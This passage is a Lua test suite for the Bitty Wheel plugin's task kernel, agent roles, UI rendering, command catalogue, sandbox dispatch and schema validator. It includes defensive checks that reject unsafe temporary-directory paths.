-- Comprehensive test suite for Bitty Wheel (bitty-terminal.wheel).
-- Tests WheelKernel, WheelAgent, WheelUI, and plugin command registration.

package.path = "./lua/?.lua;./lua/?/init.lua;" .. package.path

local WheelKernel = require("wheel.kernel")
local WheelAgent = require("wheel.agent")
local WheelUI = require("wheel.ui")
local WheelConfig = require("wheel.config")
local WheelTool = require("wheel.tool")
local WheelHost = require("wheel.host")
local WheelErrors = require("wheel.errors")
local WheelSchema = require("wheel.schema")
local WheelCommands = require("wheel.commands")

-- Every filesystem fixture in this suite lives under one private per-run root.
-- Concurrent worktrees therefore never share a directory, and each process
-- deletes only the root it created. `WHEEL_TEST_TMP` may name a caller-owned
-- base; it must be an absolute path made of shell-safe characters, and the run
-- still creates its own unique child beneath it so two calls that share a base
-- cannot collide.
local function shell_quote(value)
  return "'" .. tostring(value):gsub("'", "'\\''") .. "'"
end

-- Lua 5.1 and LuaJIT return a numeric status; Lua 5.2+ return true on success.
local function execute_succeeded(status)
  return status == true or status == 0
end

-- Fixture commands interpolate derived paths into shell strings. Reject a
-- caller base that could split a command, escape the intended tree, or inject
-- shell syntax before the run root is created.
local function validate_test_base(path, label)
  if type(path) ~= "string" or path == "" then
    error(label .. " must be a non-empty absolute path", 0)
  end
  if path:sub(1, 1) ~= "/" then
    error(label .. " must be an absolute path", 0)
  end
  if path == "/" or not path:match("^/[A-Za-z0-9._/-]+$") then
    error(label .. " must not contain whitespace or shell metacharacters", 0)
  end
  for segment in path:gmatch("[^/]+") do
    if segment == ".." then
      error(label .. " must not contain '..' segments", 0)
    end
  end
  return path
end

local TEST_RUN_ROOT = nil
local TEST_RUN_ROOT_REMOVED = false

local function cleanup_test_run_root()
  if TEST_RUN_ROOT_REMOVED or not TEST_RUN_ROOT then
    return
  end
  TEST_RUN_ROOT_REMOVED = true
  os.execute("rm -rf -- " .. shell_quote(TEST_RUN_ROOT))
end

local function bootstrap_test_run_root()
  local placeholder = os.tmpname()
  local unique = placeholder:match("([^/]+)$")
  local base = os.getenv("WHEEL_TEST_TMP")
  local root

  local ok, bootstrap_err = pcall(function()
    if not unique or unique == "" then
      error("os.tmpname returned an unusable path", 0)
    end
    if type(base) == "string" and base ~= "" then
      validate_test_base(base, "WHEEL_TEST_TMP")
      root = base .. "/wheel-test-" .. unique
    else
      -- Reuse the unique os.tmpname path as this run's private root.
      root = placeholder
    end
    validate_test_base(root, "Wheel test root")
  end)

  -- Some Lua 5.1 builds create the os.tmpname placeholder file; never leave it
  -- behind, including on validation failure.
  os.remove(placeholder)
  if not ok then
    error(bootstrap_err, 0)
  end

  -- Assign before mkdir so the failure path removes any partial root.
  TEST_RUN_ROOT = root
  local command
  if type(base) == "string" and base ~= "" then
    command = "mkdir -p -- " .. shell_quote(base)
      .. " && mkdir -- " .. shell_quote(root)
  else
    command = "mkdir -- " .. shell_quote(root)
  end
  if not execute_succeeded(os.execute(command)) then
    cleanup_test_run_root()
    error("cannot create the Wheel test root", 0)
  end
  return root
end

TEST_RUN_ROOT = bootstrap_test_run_root()

local function test_path(name)
  return TEST_RUN_ROOT .. "/" .. name
end

local function run_test(name, fn)
  local ok, err = pcall(fn)
  if ok then
    print("[PASS] " .. name)
  else
    print("[FAIL] " .. name .. ": " .. tostring(err))
    cleanup_test_run_root()
    os.exit(1)
  end
end

run_test("Wheel test harness: unsafe WHEEL_TEST_TMP bases are rejected", function()
  validate_test_base(TEST_RUN_ROOT .. "/safe-base", "test base")
  local unsafe = {
    "relative/base",
    TEST_RUN_ROOT .. "/with space",
    TEST_RUN_ROOT .. "/with;meta",
    TEST_RUN_ROOT .. "/with$dollar",
    TEST_RUN_ROOT .. "/with'quote",
    TEST_RUN_ROOT .. "/with\nnewline",
    TEST_RUN_ROOT .. "/../escape",
    "/",
    "",
  }
  for _, candidate in ipairs(unsafe) do
    local ok = pcall(validate_test_base, candidate, "test base")
    assert(not ok, "unsafe base must be rejected: " .. tostring(candidate):gsub("\n", "\\n"))
  end
end)

-- ===========================================================================
-- 1. WheelKernel Tests
-- ===========================================================================

run_test("WheelKernel: status and empty DAG", function()
  local kernel = WheelKernel.new_mock()
  local st = kernel:status()
  assert(st.task_count == 0, "expected 0 tasks")
  assert(st.slot_count == 0, "expected 0 slots")
  assert(st.active_task == nil, "expected no active task")
end)

run_test("WheelKernel: task creation and cascade readiness", function()
  local kernel = WheelKernel.new_mock()
  local t1 = kernel:create_task({ id = "CTX-100", title = "Task 1", dependencies = {} })
  assert(t1.status == "ready", "task with 0 deps should be ready")

  local t2 = kernel:create_task({ id = "CTX-101", title = "Task 2", dependencies = { "CTX-100" } })
  assert(t2.status == "pending", "task with unmet dep should be pending")

  -- Start T1
  local started = kernel:start_task("CTX-100", "worker-01")
  assert(started.status == "running")
  assert(started.generation == 1)
  assert(started.assigned_agent == "worker-01")
  assert(started.worker_id == "worker-01")

  -- Generation fencing test: wrong generation fails
  local ok_stale = pcall(function()
    kernel:complete_task("CTX-100", 999, nil)
  end)
  assert(not ok_stale, "stale generation should fail")

  -- Complete T1
  local comp = kernel:complete_task("CTX-100", 1, "hash123")
  assert(comp.status == "succeeded")

  -- T2 should automatically become Ready
  local t2_after = kernel:get_task("CTX-101")
  assert(t2_after.status == "ready", "T2 should be promoted to ready")
end)

run_test("WheelKernel: failure cascades Blocked", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "T-A", title = "A" })
  kernel:create_task({ id = "T-B", title = "B", dependencies = { "T-A" } })
  kernel:create_task({ id = "T-C", title = "C", dependencies = { "T-B" } })

  kernel:start_task("T-A", "worker")
  kernel:fail_task("T-A", 1, "build error")

  local ta = kernel:get_task("T-A")
  assert(ta.status == "failed")
  assert(ta.failure_reason == "build error")
  assert(ta.error == "build error")

  local tb = kernel:get_task("T-B")
  assert(tb.status == "blocked", "T-B should be Blocked")
  local tc = kernel:get_task("T-C")
  assert(tc.status == "blocked", "T-C should be Blocked transitively")
end)

run_test("WheelKernel: topological sort", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "C", title = "C", dependencies = { "B" } })
  kernel:create_task({ id = "A", title = "A", dependencies = {} })
  kernel:create_task({ id = "B", title = "B", dependencies = { "A" } })

  local order = kernel:topological_sort()
  assert(#order == 3)
  assert(order[1] == "A")
  assert(order[2] == "B")
  assert(order[3] == "C")
end)

run_test("WheelKernel: slots and Merkle hashing", function()
  local kernel = WheelKernel.new_mock()
  local s1 = kernel:put_slot("file1.lua", "print('hello')")
  assert(s1.size_bytes == 14)
  assert(s1.hash ~= nil)

  local fetched = kernel:get_slot("file1.lua")
  assert(fetched.found == true)
  assert(fetched.content == "print('hello')")

  local list = kernel:list_slots()
  assert(#list == 1)

  local rm = kernel:remove_slot("file1.lua")
  assert(rm.removed == true)
  local fetched2 = kernel:get_slot("file1.lua")
  assert(fetched2.found == false)
end)

run_test("WheelKernel: cognitive checkpoints and history log", function()
  local kernel = WheelKernel.new_mock()
  local cp1 = kernel:commit_checkpoint({
    why = "initial commit",
    what = "created scaffold",
    where_focus = "root",
  })
  assert(cp1.hash ~= nil)

  local cp2 = kernel:commit_checkpoint({
    why = "add feature",
    what = "implemented bridge",
    where_focus = "bridge",
  })
  assert(cp2.hash ~= nil)
  assert(cp2.parents[1] == cp1.hash)

  local log = kernel:log(10)
  assert(#log == 2)
  assert(log[1].hash == cp2.hash)
  assert(log[2].hash == cp1.hash)
end)

run_test("WheelKernel: action auto-spillover", function()
  local kernel = WheelKernel.new_mock()
  -- Small output
  local a1 = kernel:record_action({
    action_id = "act-1",
    raw_stdout = "small output",
  })
  assert(a1.spilled == false)

  -- Large output (> 4096 bytes)
  local big_str = string.rep("x", 5000)
  local a2 = kernel:record_action({
    action_id = "act-2",
    raw_stdout = big_str,
  })
  assert(a2.spilled == true)

  local recent = kernel:recent_actions()
  assert(#recent == 2)

  kernel:clear_recent_actions()
  assert(#kernel:recent_actions() == 0)
end)

run_test("WheelKernel: context compilation", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "T-CTX", title = "Active task" })
  kernel:set_active_task("T-CTX")

  local compiled = kernel:compile_context({
    system_instruction = "You are a coding assistant.",
    project_rules = { "Rule 1", "Rule 2" },
    tool_schemas = { "schema_read", "schema_write" },
    turn_prompt = "Perform step 1",
  })

  assert(compiled.prefix_hash ~= nil)
  assert(#compiled.zone1_prefix > 0)
  assert(compiled.zone2_state:find("T-CTX") ~= nil)
  assert(compiled.zone3_tail:find("Perform step 1") ~= nil)
  assert(compiled.total_bytes > 0)
end)

-- ===========================================================================
-- 2. WheelAgent Tests
-- ===========================================================================

run_test("WheelAgent: Commander plan decomposition", function()
  local kernel = WheelKernel.new_mock()
  local commander = WheelAgent.new({
    name = "commander-main",
    role = WheelAgent.Role.COMMANDER,
    kernel = kernel,
  })

  local plan = commander:decompose_plan({
    { id = "P-1", title = "Design", dependencies = {} },
    { id = "P-2", title = "Build", dependencies = { "P-1" } },
  })
  assert(#plan == 2)
  assert(kernel:get_task("P-1").status == "ready")
  assert(kernel:get_task("P-2").status == "pending")
end)

run_test("WheelAgent: Worker execution loop and checkpointing", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "W-1", title = "Coding Task", dependencies = {} })

  local worker = WheelAgent.new({
    name = "worker-code",
    role = WheelAgent.Role.CODING,
    kernel = kernel,
    tools = { "run_command" },
  })

  local outcome = worker:execute_task("W-1", function(agent, ctx, iter)
    return {
      action = { tool = "run_command", stdout = "test ok", exit_code = 0 },
      rationale = { why = "execute coding task", what = "ran test suite" },
      done = true,
    }
  end)

  assert(outcome.success == true)
  assert(outcome.task.status == "succeeded")
  assert(#outcome.checkpoints == 1)
  assert(kernel:status().active_task == nil, "active task should be cleared after execution")
end)

run_test("WheelAgent: Read-only authority enforcement", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "R-1", title = "Research Task", dependencies = {} })

  local researcher = WheelAgent.new({
    name = "researcher-01",
    role = WheelAgent.Role.RESEARCH,
    kernel = kernel,
    tools = { "read_file", "write_file" }, -- write_file declared but disallowed by role
  })

  -- Read file is allowed
  local allowed, _ = researcher:is_tool_allowed("read_file")
  assert(allowed == true)

  -- Write file is denied due to role
  local denied, err = researcher:is_tool_allowed("write_file")
  assert(denied == false)
  assert(err:find("read-only authority", 1, true) ~= nil)

  -- Attempting mutating action during task execution fails task
  local outcome = researcher:execute_task("R-1", function(agent, ctx, iter)
    return {
      action = { tool = "write_file", stdout = "wrote something" },
    }
  end)
  assert(outcome.success == false)
  assert(outcome.task.status == "failed")
  assert(outcome.error:find("read-only authority", 1, true) ~= nil)
end)

run_test("WheelAgent: Reviewer verification and approval", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "REV-1", title = "Feature Task", dependencies = {} })
  kernel:start_task("REV-1", "worker")
  kernel:complete_task("REV-1", 1, "cp_hash_123")

  local reviewer = WheelAgent.new({
    name = "reviewer-01",
    role = WheelAgent.Role.REVIEWER,
    kernel = kernel,
    tools = { "read_file" },
  })

  local rev = reviewer:review_task("REV-1", function(agent, task, history)
    assert(task.id == "REV-1")
    return true, "all acceptance criteria verified"
  end)

  assert(rev.approved == true)
  assert(rev.checkpoint ~= nil)
end)

-- ===========================================================================
-- 3. WheelUI Tests
-- ===========================================================================

run_test("WheelUI: status, graph waves, and telemetry", function()
  local kernel = WheelKernel.new_mock()
  kernel:create_task({ id = "T-1", title = "Task 1", priority = 0 })
  kernel:create_task({ id = "T-2", title = "Task 2", priority = 1, dependencies = { "T-1" } })
  kernel:create_task({ id = "T-3", title = "Task 3", priority = 2, dependencies = { "T-1" } })
  kernel:create_task({ id = "T-4", title = "Task 4", priority = 0, dependencies = { "T-2", "T-3" } })

  kernel:start_task("T-1", "w1")
  kernel:complete_task("T-1", 1, "cp1")
  kernel:start_task("T-2", "w2")
  kernel:set_active_task("T-2")

  local status_str = WheelUI.format_status(kernel)
  assert(status_str:find("Active Task:%s+T%-2") ~= nil)
  assert(status_str:find("Tasks: 4 total") ~= nil)

  local graph_str = WheelUI.format_graph(kernel)
  assert(graph_str:find("%-%- Wave 1") ~= nil)
  assert(graph_str:find("%-%- Wave 2") ~= nil)
  assert(graph_str:find("%-%- Wave 3") ~= nil)
  assert(graph_str:find("%[▶%] T%-2 %(P1%): Task 2 <%-%- ACTIVE") ~= nil)
  assert(graph_str:find("%[•%] T%-3 %(P2%): Task 3") ~= nil)

  local ctx = kernel:compile_context({ turn_prompt = "hello" })
  local telem_str = WheelUI.format_telemetry(ctx)
  assert(telem_str:find("Prefix Hash:") ~= nil)
  assert(telem_str:find("Total Bytes:") ~= nil)

  local scene = WheelUI.render_scene_node(kernel)
  assert(scene.type == "Text")
  assert(type(scene.content) == "string")
end)

run_test("WheelUI: diamond and multi-path DAG topological wave calculation", function()
  -- 1. Symmetric Diamond DAG: A -> B -> D, A -> C -> D
  local diamond_tasks = {
    { id = "D", dependencies = { "B", "C" } },
    { id = "C", dependencies = { "A" } },
    { id = "B", dependencies = { "A" } },
    { id = "A", dependencies = {} },
  }
  local depths, max_wave = WheelUI.calculate_waves(diamond_tasks)
  assert(depths["A"] == 1, "A should be Wave 1")
  assert(depths["B"] == 2, "B should be Wave 2")
  assert(depths["C"] == 2, "C should be Wave 2")
  assert(depths["D"] == 3, "D should be Wave 3")
  assert(max_wave == 3, "max_wave should be 3")

  -- 2. Asymmetric Diamond / Multi-path DAG: A -> B -> C -> D, and A -> D
  local asymmetric_tasks = {
    { id = "D", dependencies = { "A", "C" } },
    { id = "A", dependencies = {} },
    { id = "B", dependencies = { "A" } },
    { id = "C", dependencies = { "B" } },
  }
  local asym_depths, asym_max = WheelUI.calculate_waves(asymmetric_tasks)
  assert(asym_depths["A"] == 1, "A should be Wave 1")
  assert(asym_depths["B"] == 2, "B should be Wave 2")
  assert(asym_depths["C"] == 3, "C should be Wave 3")
  assert(asym_depths["D"] == 4, "D should be Wave 4 via longest path A->B->C->D")
  assert(asym_max == 4, "max_wave should be 4")

  -- 3. Missing dependencies field resilience
  local raw_tasks = {
    { id = "RAW-1", title = "Task without dependencies field" },
    { id = "RAW-2", title = "Second task without field" },
    { id = "RAW-3", dependencies = { "RAW-1" } },
  }
  local raw_depths, raw_max = WheelUI.calculate_waves(raw_tasks)
  assert(raw_depths["RAW-1"] == 1, "RAW-1 should be Wave 1")
  assert(raw_depths["RAW-2"] == 1, "RAW-2 should be Wave 1")
  assert(raw_depths["RAW-3"] == 2, "RAW-3 should be Wave 2")
  assert(raw_max == 2, "raw_max should be 2")

  -- 4. External missing prerequisite resilience
  local ext_tasks = {
    { id = "EXT-DEP", dependencies = { "NON_EXISTENT_UPSTREAM" } },
  }
  local ext_depths, ext_max = WheelUI.calculate_waves(ext_tasks)
  assert(ext_depths["EXT-DEP"] == 2, "task with missing external dependency resolves to depth 2")
  assert(ext_max == 2)

  -- 5. Cycle guard: cycle does not crash or loop infinitely
  local cycle_tasks = {
    { id = "CYC-1", dependencies = { "CYC-2" } },
    { id = "CYC-2", dependencies = { "CYC-1" } },
  }
  local cyc_depths, cyc_max = WheelUI.calculate_waves(cycle_tasks)
  assert(type(cyc_depths["CYC-1"]) == "number")
  assert(type(cyc_depths["CYC-2"]) == "number")
  assert(cyc_max >= 1)
end)

-- ===========================================================================
-- 4. Plugin Init and Command Registration Tests
-- ===========================================================================

-- The complete v1 command catalog registered by lua/wheel/init.lua. Keep this
-- in the same order as the manifest's [lazy].commands list so ordering drift
-- is caught alongside missing, duplicate, or extra registrations.
local EXPECTED_COMMANDS = {
  {
    id = "hello",
    title = "Wheel: hello",
    description = "Print a greeting from Wheel.",
  },
  {
    id = "status",
    title = "Wheel: status",
    description = "Display Wheel kernel status and telemetry summary.",
  },
  {
    id = "graph",
    title = "Wheel: graph",
    description = "Render ASCII Task DAG and topological execution waves.",
  },
  {
    id = "plan",
    title = "Wheel: plan",
    description = "Initialize or decompose a software engineering plan in the Task DAG.",
  },
  {
    id = "run",
    title = "Wheel: run",
    description = "Execute the next ready task in the DAG using WheelAgent.",
  },
  {
    id = "trust",
    title = "Wheel: trust",
    description = "Inspect, approve, or revoke project configuration trust.",
  },
  {
    id = "team",
    title = "Wheel: team status",
    description = "Display Wheel multi-agent peer colleague roster and live states.",
  },
  {
    id = "context",
    title = "Wheel: context",
    description = "Inspect active semantic slots, Merkle root, and prefix-cache status.",
  },
  {
    id = "tools",
    title = "Wheel: tools",
    description = "List registered Wheel agent tools and intent schemas.",
  },
  {
    id = "orchestrate",
    title = "Wheel: orchestrate",
    description = "Run autonomous multi-agent wave orchestration loop over Task DAG.",
  },
  {
    id = "models",
    title = "Wheel: models",
    description = "Display configured model profiles, providers, and parameters.",
  },
  {
    id = "branch",
    title = "Wheel: branch",
    description = "List context branches or display active branch and HEAD commit.",
  },
  {
    id = "checkpoint",
    title = "Wheel: checkpoint",
    description = "Display recent context checkpoints (commit ancestry log).",
  },
  {
    id = "reflog",
    title = "Wheel: reflog",
    description = "Display recent context reflog transitions and audit journal.",
  },
}

-- Registration-time bounds. Titles and descriptions are user-visible catalog
-- metadata, so both stay short and bounded; a denial is a typed, single-line
-- error table rather than an unbounded traceback.
local COMMAND_TITLE_MAX_LENGTH = 32
local COMMAND_DESCRIPTION_MAX_LENGTH = 128
-- Host-sandbox dispatch budget, enforced while the handler executes by a debug
-- count hook (see dispatch_with_budget). A handler that exceeds the CPU
-- ceiling or the instruction budget is interrupted at the next hook tick
-- instead of blocking the suite. The sentinel is explicitly marked opaque so
-- the typed boundary preserves it instead of normalizing it to E_INTERNAL.
local SANDBOX_DISPATCH_TIMEOUT_SECONDS = 10
local SANDBOX_HOOK_INSTRUCTION_INTERVAL = 100000
local SANDBOX_DISPATCH_INSTRUCTION_BUDGET = 10000000
local SANDBOX_BUDGET_EXCEEDED = WheelErrors.passthrough(setmetatable({}, {
  __tostring = function()
    return "sandbox dispatch budget exceeded"
  end,
}))

-- Commands that complete under the accepted v1 sandbox (no io, no process or
-- env authority) and the notification title each must emit.
local SANDBOX_HANDLED_TITLES = {
  hello = "Wheel",
  status = "Wheel Status",
  graph = "Wheel Task DAG",
  run = "Wheel Run",
  team = "Wheel Team Roster",
  context = "Wheel Context State",
  tools = "Wheel Tools Registry",
  models = "Wheel Models",
  branch = "Wheel Context Branches",
  checkpoint = "Wheel Checkpoints",
  reflog = "Wheel Reflog",
}

-- Deterministic handled bodies asserted where the text is stable. `run` with
-- no ready task is the only authority-free handled branch with fixed text.
local SANDBOX_HANDLED_BODIES = {
  run = "No ready tasks available to execute.",
}

-- Commands that need authority the sandbox removes, mapped to the capability
-- the host would have to grant. Messages are host-worded and stable; the
-- interpreter's nil-member wording is never pinned.
local SANDBOX_DENIALS = {
  plan = "env.read",
  trust = "fs.read",
  orchestrate = "env.read",
}

--- Collect command registrations and preserve duplicate evidence.
-- The accepted v1 bridge captures `commands.register` calls and exposes no
-- registry listing, so capture set equality is the available bounds check.
local function new_command_capture()
  local capture = { defs = {}, counts = {}, order = {} }
  capture.register = function(def)
    capture.defs[def.id] = def
    capture.counts[def.id] = (capture.counts[def.id] or 0) + 1
    capture.order[#capture.order + 1] = def.id
    return #capture.order
  end
  return capture
end

--- Assert the exact 14-command catalog, richer metadata, and registration bounds.
local function assert_command_catalog(capture)
  assert(
    #capture.order == #EXPECTED_COMMANDS,
    string.format("expected %d command registrations, got %d", #EXPECTED_COMMANDS, #capture.order)
  )

  local expected_ids = {}
  for index, expected in ipairs(EXPECTED_COMMANDS) do
    expected_ids[expected.id] = true

    local def = capture.defs[expected.id]
    assert(def ~= nil, "missing command registration: " .. expected.id)
    assert(capture.counts[expected.id] == 1, "duplicate command registration: " .. expected.id)
    assert(capture.order[index] == expected.id,
      string.format("registration %d must be %s, got %s", index, expected.id, tostring(capture.order[index])))

    assert(def.id == expected.id, "command id drifted for " .. expected.id)
    assert(def.title == expected.title, "command title drifted for " .. expected.id)
    assert(def.description == expected.description, "command description drifted for " .. expected.id)
    assert(type(def.title) == "string" and #def.title > 0 and #def.title <= COMMAND_TITLE_MAX_LENGTH,
      "command title must be non-empty and bounded for " .. expected.id)
    assert(type(def.description) == "string" and #def.description > 0
      and #def.description <= COMMAND_DESCRIPTION_MAX_LENGTH,
      "command description must be non-empty and bounded for " .. expected.id)
    assert(type(def.run) == "function", "command handler must be a function for " .. expected.id)
    assert(type(def.args_schema) == "table", "command arguments schema is missing for " .. expected.id)
    assert(type(def.result_schema) == "table", "command result schema is missing for " .. expected.id)

    local args_ok, args_reason = WheelSchema.validate_schema(def.args_schema, "args_schema")
    assert(args_ok, "invalid command arguments schema for " .. expected.id .. ": " .. tostring(args_reason))
    local result_ok, result_reason = WheelSchema.validate_schema(def.result_schema, "result_schema")
    assert(result_ok, "invalid command result schema for " .. expected.id .. ": " .. tostring(result_reason))
  end

  for id in pairs(capture.defs) do
    assert(expected_ids[id], "unexpected command registration: " .. id)
  end
end

--- Assert the accepted bridge error shape: exactly class/code/message.
local function assert_typed_error(err, expected_code, expected_class)
  assert(type(err) == "table", "error must be a typed table, got " .. type(err))
  local fields = 0
  for key in pairs(err) do
    assert(key == "class" or key == "code" or key == "message",
      "unexpected typed error field: " .. tostring(key))
    fields = fields + 1
  end
  assert(fields == 3, "typed error must carry exactly class/code/message")
  assert(err.class == (expected_class or "runtime"),
    "unexpected typed error class: " .. tostring(err.class))
  assert(err.code == expected_code, "unexpected typed error code: " .. tostring(err.code))
  assert(type(err.message) == "string" and #err.message > 0
    and #err.message <= WheelErrors.MESSAGE_MAX_LENGTH,
    "typed error message must be non-empty and within WheelErrors.MESSAGE_MAX_LENGTH")
  assert(err.message:find("\n", 1, true) == nil and err.message:find("\r", 1, true) == nil,
    "typed error message must be a single line")
  local rendered = tostring(err)
  assert(#rendered > 0, "rendered typed error must be non-empty")
  assert(rendered:find("\n", 1, true) == nil, "rendered typed error must not contain a traceback")
  return err
end

--- Assert the typed, bounded denial for an unavailable host capability.
local function assert_sandbox_denial(err, expected_capability)
  local denial = assert_typed_error(err, "E_CAPABILITY_DENIED")
  assert(denial.message == "capability '" .. expected_capability .. "' is not granted",
    "unexpected sandbox denial message: " .. denial.message)
  assert(denial.message:find("attempt to", 1, true) == nil,
    "capability denial must not echo raw interpreter wording")
end

--- Assert that a schema declaration is admitted by the shared validator.
local function assert_schema_valid(schema, path)
  local ok, reason = WheelSchema.validate_schema(schema, path)
  assert(ok, "schema must be valid: " .. tostring(reason))
end

--- Assert that a schema declaration is rejected with a bounded reason.
local function assert_schema_invalid(schema, needle, path)
  local ok, reason = WheelSchema.validate_schema(schema, path)
  assert(not ok, "schema must be rejected")
  assert(type(reason) == "string" and #reason > 0, "schema rejection reason must be non-empty")
  if needle then
    assert(reason:find(needle, 1, true) ~= nil, "unexpected schema rejection: " .. reason)
  end
end

--- Assert that an argument set is accepted by the shared validator.
local function assert_args_valid(schema, args)
  local ok, reason = WheelSchema.validate_args(schema, args)
  assert(ok, "arguments must be accepted: " .. tostring(reason))
end

--- Assert that an argument set is rejected with a bounded reason.
local function assert_args_invalid(schema, args, needle)
  local ok, reason = WheelSchema.validate_args(schema, args)
  assert(not ok, "arguments must be rejected")
  assert(type(reason) == "string" and #reason > 0, "argument rejection reason must be non-empty")
  if needle then
    assert(reason:find(needle, 1, true) ~= nil, "unexpected argument rejection: " .. reason)
  end
end

--- Assert that `text` is valid UTF-8 and return its code-point count.
-- Uses the Lua 5.3+ `utf8` library when present; otherwise validates the byte
-- structure directly so the suite stays runnable on Lua 5.1/LuaJIT.
local function assert_valid_utf8(text)
  local has_utf8, utf8lib = pcall(require, "utf8")
  if has_utf8 and type(utf8lib) == "table" and type(utf8lib.len) == "function" then
    local length, position = utf8lib.len(text)
    assert(length ~= nil, "invalid UTF-8 at byte " .. tostring(position))
    return length
  end

  local index = 1
  local length = 0
  while index <= #text do
    local first = text:byte(index)
    if first < 0x80 then
      index = index + 1
    elseif first >= 0xC2 and first <= 0xDF then
      local second = text:byte(index + 1)
      assert(second and second >= 0x80 and second <= 0xBF,
        "invalid 2-byte UTF-8 sequence at byte " .. index)
      index = index + 2
    elseif first >= 0xE0 and first <= 0xEF then
      local second, third = text:byte(index + 1), text:byte(index + 2)
      assert(second and second >= 0x80 and second <= 0xBF
          and third and third >= 0x80 and third <= 0xBF,
        "invalid 3-byte UTF-8 sequence at byte " .. index)
      index = index + 3
    elseif first >= 0xF0 and first <= 0xF4 then
      local second, third, fourth = text:byte(index + 1), text:byte(index + 2), text:byte(index + 3)
      assert(second and second >= 0x80 and second <= 0xBF
          and third and third >= 0x80 and third <= 0xBF
          and fourth and fourth >= 0x80 and fourth <= 0xBF,
        "invalid 4-byte UTF-8 sequence at byte " .. index)
      index = index + 4
    else
      error("invalid UTF-8 lead byte at " .. index)
    end
    length = length + 1
  end
  return length
end

--- Fixture schema that exercises every admitted keyword and bound.
local FUNCTION_SCHEMA = {
  type = "object",
  properties = {
    name = { type = "string", minLength = 1, maxLength = 8 },
    retries = { type = "integer", minimum = 0, maximum = 5 },
    ratio = { type = "number", minimum = 0, maximum = 1 },
    dry_run = { type = "boolean" },
    tags = {
      type = "array",
      items = { type = "string", maxLength = 8 },
      minItems = 1,
      maxItems = 3,
    },
    nested = {
      type = "object",
      properties = {
        mode = { type = "string", enum = { "a", "b" }, maxLength = 1 },
      },
      required = { "mode" },
      additionalProperties = false,
    },
  },
  required = { "name" },
  additionalProperties = false,
}

--- Run one command handler under an interrupting dispatch budget.
-- A debug count hook is installed before the handler starts, so a CPU-bound
-- hang is interrupted at the next tick (or as soon as the instruction budget
-- is spent) instead of blocking the suite. The hook is always cleared before
-- returning to the caller. Returns `ok, err, enforced`; `enforced` is false
-- only when the interpreter lacks `debug.sethook`, in which case the ceiling
-- is explicitly skipped and the caller must not claim a bound.
local function dispatch_with_budget(def)
  local hook_supported = type(debug) == "table" and type(debug.sethook) == "function"
  if not hook_supported then
    local ok, err = pcall(def.run)
    return ok, err, false
  end

  local started_clock = os.clock()
  local instructions = 0
  local function budget_hook()
    instructions = instructions + SANDBOX_HOOK_INSTRUCTION_INTERVAL
    if instructions >= SANDBOX_DISPATCH_INSTRUCTION_BUDGET
      or os.clock() - started_clock > SANDBOX_DISPATCH_TIMEOUT_SECONDS then
      -- Clear first so the sentinel unwinds without re-entering the hook.
      debug.sethook()
      error(SANDBOX_BUDGET_EXCEEDED, 0)
    end
  end

  debug.sethook(budget_hook, "", SANDBOX_HOOK_INSTRUCTION_INTERVAL)
  local ok, err = pcall(def.run)
  debug.sethook()
  return ok, err, true
end

local function is_wheel_module(name)
  return name == "wheel" or name:match("^wheel%.") ~= nil
    or name == "lua.wheel" or name:match("^lua%.wheel%.") ~= nil
end

--- Run `fn` with the authority-relevant surface of the accepted v1 Lua sandbox.
-- Modeled absent: io, loadfile, dofile, os.execute, os.getenv, os.tmpname, and
-- os.remove. Retained: os.time, os.clock, and os.date. Other os entries
-- (os.exit, os.rename, ...) are intentionally not modeled because no Wheel
-- call site reaches them during activation or command dispatch.
-- The fixture is hermetic: it mutates only process globals for the duration of
-- the call, never reads user files or the network, and restores package state
-- and every removed global on both success and failure.
local function run_in_host_sandbox(fn)
  local saved = {
    io = _G.io,
    loadfile = _G.loadfile,
    dofile = _G.dofile,
    os_execute = os.execute,
    os_getenv = os.getenv,
    os_tmpname = os.tmpname,
    os_remove = os.remove,
    bitty = _G.bitty,
    modules = {},
  }

  for name, module in pairs(package.loaded) do
    if is_wheel_module(name) then
      saved.modules[name] = module
      package.loaded[name] = nil
    end
  end

  _G.io = nil
  _G.loadfile = nil
  _G.dofile = nil
  os.execute = nil
  os.getenv = nil
  os.tmpname = nil
  os.remove = nil

  local ok, err = pcall(fn)

  _G.io = saved.io
  _G.loadfile = saved.loadfile
  _G.dofile = saved.dofile
  os.execute = saved.os_execute
  os.getenv = saved.os_getenv
  os.tmpname = saved.os_tmpname
  os.remove = saved.os_remove
  _G.bitty = saved.bitty

  for name in pairs(package.loaded) do
    if is_wheel_module(name) then
      package.loaded[name] = nil
    end
  end
  for name, module in pairs(saved.modules) do
    package.loaded[name] = module
  end

  if not ok then
    error(err, 0)
  end
end

run_test("Wheel Init: command registration and dispatch", function()
  -- Mock bitty host API
  local capture = new_command_capture()
  local notifications = {}

  _G.bitty = {
    commands = {
      register = capture.register,
    },
    notify = {
      show = function(payload)
        table.insert(notifications, payload)
        return true
      end,
    },
  }

  -- Load init.lua
  local wheel = require("wheel.init")
  assert(wheel.kernel ~= nil)
  assert(wheel.agent ~= nil)
  assert(wheel.ui ~= nil)

  -- Verify all 14 commands were registered exactly once with expected metadata.
  assert_command_catalog(capture)

  local function dispatch(id)
    local registered_before = #capture.order
    capture.defs[id].run()
    assert(#capture.order == registered_before, "command dispatch must not register commands: " .. id)
  end

  -- Test running hello
  dispatch("hello")
  assert(#notifications == 1)
  assert(notifications[1].title == "Wheel")

  -- Test running plan
  dispatch("plan")
  assert(#notifications == 2)
  assert(notifications[2].title == "Wheel Plan")
  assert(#wheel.kernel:list_tasks() == 3)

  -- Test running status
  dispatch("status")
  assert(#notifications == 3)
  assert(notifications[3].title == "Wheel Status")

  -- Test running graph
  dispatch("graph")
  assert(#notifications == 4)
  assert(notifications[4].title == "Wheel Task DAG")

  -- Test running run (executes CTX-0001)
  dispatch("run")
  assert(#notifications == 5)
  assert(notifications[5].title == "Wheel Run")
  assert((wheel.kernel:get_task("CTX-0001").status or ""):lower() == "succeeded")
  -- CTX-0002 should now be Ready
  assert((wheel.kernel:get_task("CTX-0002").status or ""):lower() == "ready")

  _G.bitty = nil
end)

run_test("WheelSchema: finite vocabulary and admission bounds", function()
  -- Every type and admitted keyword composes into a valid declaration.
  assert_schema_valid({ type = "boolean" })
